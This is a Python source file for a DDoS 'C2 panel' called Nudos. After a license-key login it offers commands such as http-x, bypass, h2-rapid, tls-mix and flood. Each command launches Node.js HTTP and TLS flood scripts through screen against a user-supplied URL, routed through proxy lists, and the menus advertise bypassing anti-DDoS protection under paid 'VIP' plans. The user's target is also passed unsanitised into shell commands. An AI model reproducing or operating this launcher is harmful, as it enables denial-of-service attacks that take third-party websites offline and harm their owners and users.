####################
#     C2-Nudos | SEP 2023    #
#      DEVELOPER : Mika        #
####################  

import socket
import os
import requests
import random
import getpass
import time
import sys
import subprocess
from pystyle import Colors, Colorate
import os
import sys
from datetime import datetime

				
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxys = open('core/http.txt').readlines()
bots = len(proxys)
bots_str = str(bots)

proxys = open('core/proxy.txt').readlines()
bots = len(proxys)
bots_str = str(bots)

clear()
def si():
    print(Colorate.Diagonal(Colors.black_to_white, "  C2 Panel | User: root | Plan: VVIP | Proxy: " + bots_str + " "))
    print("")

def l7():
    clear()
    print(Colorate.Diagonal(Colors.black_to_white, "  C2 Panel | User: root | Plan: VVIP | Proxy: " + bots_str + " "))
    print("")
    print(f'''
   |\---/|                    
   | ,_, |
    \_`_/-..----.
 ___/ `   ' ,""+ \  
(__...'   __\    |`.___.';
  (_,...'(_,.`__)/'.....+
\033[39m                    𝙼𝙴𝚃𝙷𝙾𝙳𝚂 𝙻𝙰𝚈𝙴𝚁7

\033[36m!http : HTTP RAW flood ONLY HTTP [VIP]
\033[36m!http-x : Good For Unprotected Website [VIP]
\033[36m!bypass : BYPASS Good for UAM Bypass [VIP]
\033[36m!h2-rapid : HTTP2 flood optimized bypass [VIP]
\033[36m!tls-mix : HTTP2 flood make many RPS for bypass [VIP]
\033[36m!flood : https-flood flooding GET website [NORMAL]

   \033[35mTYPE THE \033[35m[\033[32mMETHODS\033[35m] \033[35m[\033[32mURL\033[35m] \033[35m[\033[32mTIME\033[35m] TO START ATTACK
''')

clear()
def menu():
    clear()
    print(Colorate.Diagonal(Colors.black_to_white, "  C2 Panel | User: root | Plan: VVIP | Proxy: " + bots_str + " "))
    print("")
    print("""
   |\---/|            ꜱᴀᴍᴘ-ɴᴜᴅᴏꜱ ®
   | ,_, |
    \_`_/-..----.
 ___/ `   ' ,""+ \  
(__...'   __\    |`.___.';
  (_,...'(_,.`__)/'.....+                                            
                             
                 WELCOME TO Nudos-PANEL
            TYPE \033[36m[\033[32mHELP\033[36m] TO SEE OUR METHODS
                     
""")

def p():
    menu()
    while(True):
        cnc = input('''\033[36m╔══[\033[37mMika\033[36m@\033[37mroot\033[36m]
\033[36m╚════\033[37m➤\033[37m ''')
        if cnc == "L7" or cnc == "l7" or cnc == "layer7" or cnc == "Layer7":
            l7()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            p()

#stop#
        elif "stop" in cnc:
            try:
                subprocess.run(['pkill C2.py'], shell=True)
                print(f" [!] Attack Stopped!")
            except IndexError:
                print('stop')
                
#VIP#
        elif "http-x" in cnc:
            try:
                url=cnc.split()[1]
                time=cnc.split()[2]
                subprocess.run([f'screen -dm node ./core/HTTP-X {url} {time} 32 4 core/proxy.txt '], shell=True)
                print("ATTACK HAS BEEN STARTED!")

            except IndexError:
                print('Usage: http-x <target> <time>  ')
                print('Example: http-x http://xnxx.com 300 ')


        elif "bypass" in cnc:
            try:
                url=cnc.split()[1]
                time=cnc.split()[2]
                subprocess.run([f'screen -dm node ./core/Bypass {url} {time} 32 4 core/proxy.txt '], shell=True)
                subprocess.run([f'screen -dm node ./core/FLOOD.js {url} {time} 32 3 core/proxy.txt cookie '], shell=True)
                print("ATTACK HAS BEEN STARTED!")

            except IndexError:
                print('Usage: bypass <target> <time>  ')
                print('Example: bypass http://xnxx.com 300 ')


        elif "flood" in cnc:
            try:
                url=cnc.split()[1]
                time=cnc.split()[2]
                subprocess.run([f'screen -dm node ./core/FLOOD.js {url} {time} 32 3 core/proxy.txt cookie '], shell=True)
                print("ATTACK HAS BEEN STARTED!")
            except IndexError:
                print('Usage: flood <target> <time>  ')
                print('Example: flood http://xnxx.com 300 ')
                

        elif "h2-rapid" in cnc:
            try:
                url=cnc.split()[1]
                time=cnc.split()[2]
                subprocess.run([f'screen -dm node ./core/h2-rapid {url} {time} 32 7 core/proxy.txt '], shell=True)
                print("ATTACK HAS BEEN STARTED!")

            except IndexError:
                print('Usage: h2-rapid <target> <time>  ')
                print('Example: h2-rapid http://xnxx.com 300 ')


        elif "tls-mix" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                subprocess.run([f'screen -dm node ./core/TLS.js {url} {time} 32 4 '], shell=True)
                subprocess.run([f'screen -dm node ./core/tlsv2.js {url} {time} 32 7 core/proxy.txt cookie '], shell=True)                
                print("ATTACK HAS BEEN STARTED!")
            except IndexError:
                print('Usage: tls <host> <duration>  ')
                print('Example: tls https://example.com/ 60  ')
                
                                         
        elif "http" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                subprocess.run([f'screen -dm node ./core/slow {url} {time} '], shell=True)
                print("ATTACK HAS BEEN STARTED!")
            except IndexError:
                print('Usage: http <host> <duration>  ')
                print('Example: http https://example.com/ 60  ')



                
        elif "PROXY" in cnc:
            try:
                os.system(f'python3 core/scrape.py')
            except IndexError:
                print('Usage: PROXY')
                print('Example: PROXY')
                                                              
                
        elif "help" in cnc:
            print(f'''
LAYER7 ► SHOW LAYER7 METHODS
CLEAR ► CLEAR TERMINAL
PROXY ► SCRAPE PROXY
            ''')                                                                                                                            

        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass

#LOGIN
clear()
def set_console_title(title):
    os.system(f"NUDOS {title}")

def validate_license(license_key, valid_licenses):
    if license_key in valid_licenses:
        expiration_date = valid_licenses[license_key]
        if datetime.now() < expiration_date:
            return True
    return False

def login():
    set_console_title("[Login Account [NUDOS C2]")
    clear()

    # Dictionary of valid license keys and their expiration dates
    valid_licenses = {
        "1": datetime(3000, 9, 1)
    }

    print(f"""
# What do you get when you cross a 301 redirect with a 404 error?
# A website with an identity crisis!
# -------------------------------------------------
          
                WELCOME TO Nudos-PANEL
          AUTHOR IN TELEGRAM : @mikamika27⠀⠀
                           
                           """)

    # License validation
    license_key = input("\033[32m</>\033[36m Enter your license key: ")
    if not validate_license(license_key, valid_licenses):
        print("\033[36m</> Invalid or expired license key! ")
        sys.exit(1)

    p()

login()
